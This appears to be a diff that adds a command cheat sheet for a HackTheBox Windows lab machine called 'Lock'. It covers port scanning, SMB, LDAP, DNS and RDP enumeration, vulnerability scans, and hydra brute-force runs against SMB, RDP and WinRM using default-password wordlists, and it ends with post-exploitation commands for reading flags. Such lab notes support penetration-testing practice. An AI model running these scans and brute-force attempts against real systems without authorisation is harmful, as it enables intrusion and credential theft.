@@ -1,0 +1,162 @@
+# SYSTEM 4: LOCK (Windows) - QUICK COMMAND REFERENCE
+# IP: 10.129.6.226
+# Platform: HackTheBox
+
+# ============================================
+# BASIC CONNECTIVITY
+# ============================================
+ping -c 4 10.129.6.226
+
+# ============================================
+# PORT SCANNING
+# ============================================
+# Initial scan
+nmap -sC -sV -oN lock_initial.txt 10.129.6.226
+
+# Full port scan
+nmap -p- --min-rate 2000 -oN lock_full.txt 10.129.6.226
+
+# UDP scan (top 100 ports)
+nmap -sU --top-ports 100 -oN lock_udp.txt 10.129.6.226
+
+# ============================================
+# SMB ENUMERATION (Windows - Port 445)
+# ============================================
+# Detailed SMB scan
+nmap -p 445 --script smb-os-discovery,smb-security-mode,smb-enum-shares,smb-enum-users,smb-vuln-* -oN lock_smb.txt 10.129.6.226
+
+# Enum4linux
+enum4linux -a 10.129.6.226
+
+# SMB client
+smbclient -L //10.129.6.226/ -N
+
+# SMB map
+smbmap -H 10.129.6.226
+
+# SMB null session
+smbclient -L //10.129.6.226/ -N -U ""
+
+# SMB anonymous
+smbclient //10.129.6.226/ -N -U "guest"
+
+# ============================================
+# RDP ENUMERATION (Windows - Port 3389)
+# ============================================
+# RDP info
+nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 -oN lock_rdp.txt 10.129.6.226
+
+# RDP banner
+nc 10.129.6.226 3389 < /dev/null
+
+# ============================================
+# LDAP ENUMERATION (Windows Domain - Port 389)
+# ============================================
+# LDAP info
+nmap -p 389,636 --script ldap-rootdse,ldap-search -oN lock_ldap.txt 10.129.6.226
+
+# LDAP search
+ldapsearch -x -H ldap://10.129.6.226 -s base
+
+# ============================================
+# DNS ENUMERATION (Windows Domain - Port 53)
+# ============================================
+# DNS zone transfer attempt
+dig @10.129.6.226 axfr
+
+# DNS info
+nmap -p 53 --script dns-zone-transfer,dns-service-discovery -oN lock_dns.txt 10.129.6.226
+
+# ============================================
+# NETBIOS ENUMERATION (Windows - Port 137/139)
+# ============================================
+# NBTscan
+nbtscan 10.129.6.226
+
+# NetBIOS info
+nmap -p 137,139 --script nbstat -oN lock_netbios.txt 10.129.6.226
+
+# ============================================
+# WEB ENUMERATION (if port 80/443)
+# ============================================
+# Web root
+curl -s -L http://10.129.6.226/
+curl -s -L https://10.129.6.226/
+
+# Robots.txt
+curl -s http://10.129.6.226/robots.txt
+
+# Directory enumeration
+ffuf -u http://10.129.6.226/FUZZ -w ~/Downloads/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -t 50
+
+# ============================================
+# VULNERABILITY SCANNING
+# ============================================
+# General vulnerability scan
+nmap --script vuln -oN lock_vuln.txt 10.129.6.226
+
+# Windows-specific vulnerabilities
+nmap --script smb-vuln-*,rdp-vuln-*,msrpc-vuln-* -oN lock_windows_vuln.txt 10.129.6.226
+
+# ============================================
+# BRUTE FORCE ATTEMPTS
+# ============================================
+# Create wordlists first
+cat > users.txt <<EOF
+administrator
+admin
+guest
+user
+test
+lock
+LOCK
+Administrator
+Admin
+EOF
+
+cat > passwords.txt <<EOF
+password
+Password123
+P@ssw0rd
+admin
+Admin123
+Welcome123
+lock
+LOCK
+Lock123
+Summer2024
+Winter2024
+Spring2024
+Fall2024
+EOF
+
+# SMB brute force
+hydra -L users.txt -P passwords.txt smb://10.129.6.226 -t 4
+
+# RDP brute force
+hydra -L users.txt -P passwords.txt rdp://10.129.6.226 -t 4
+
+# WinRM brute force (if port 5985/5986 open)
+hydra -L users.txt -P passwords.txt winrm://10.129.6.226 -t 4
+
+# ============================================
+# EXPLOIT SEARCH
+# ============================================
+# Search for Windows exploits
+searchsploit windows
+
+# ============================================
+# POST-EXPLOITATION (if access gained)
+# ============================================
+# Windows commands to run after gaining access:
+# whoami
+# hostname
+# systeminfo
+# ipconfig /all
+# net user
+# net localgroup administrators
+# type C:\Users\Administrator\Desktop\root.txt
+# type C:\Users\Public\user.txt
+# dir C:\Users\*\Desktop\user.txt /s
+# dir C:\Users\*\Desktop\root.txt /s
+
